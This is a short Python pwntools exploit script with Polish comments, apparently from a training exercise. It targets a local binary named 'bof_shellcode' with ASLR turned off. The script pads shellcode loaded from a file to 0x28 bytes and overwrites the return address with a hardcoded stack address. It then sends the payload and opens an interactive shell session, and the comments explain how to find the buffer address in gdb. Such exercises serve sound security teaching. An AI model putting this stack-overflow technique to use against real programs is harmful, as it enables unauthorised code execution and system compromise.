# -*- coding: utf-8 -*-
from pwn import *


# na razie wyłączamy aslr
r = process("./bof_shellcode", aslr = False)

# gdb.attach(r)

with open("shellcode", "rb") as f:
    shellcode = f.read()

msg = shellcode # b"a"*0x28
msg = msg.ljust(0x28, b"\x00")
# adres początku bufora, który możemy sprawdzić np. w gdb, ustawiając
# tutaj jakiś nieistniejący adres (np. 0x123) i przeglądając stos
# w momencie crashu programu
msg += p64(0x7fffffffe200)

r.sendline(msg)

r.interactive()


